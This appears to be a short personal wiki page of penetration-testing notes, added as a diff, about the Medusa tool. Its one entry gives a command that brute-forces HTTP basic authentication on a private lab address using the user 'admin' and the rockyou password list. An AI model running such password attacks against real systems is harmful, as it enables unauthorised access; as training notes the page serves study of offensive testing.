@@ -1,0 +1,10 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-05-21T14:30:35-04:00
+
+====== Medusa ======
+Created Thursday 21 May 2020
+
+====== HTTP htaccess Attack ======
+**medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http**
+**-m DIR:/admin**
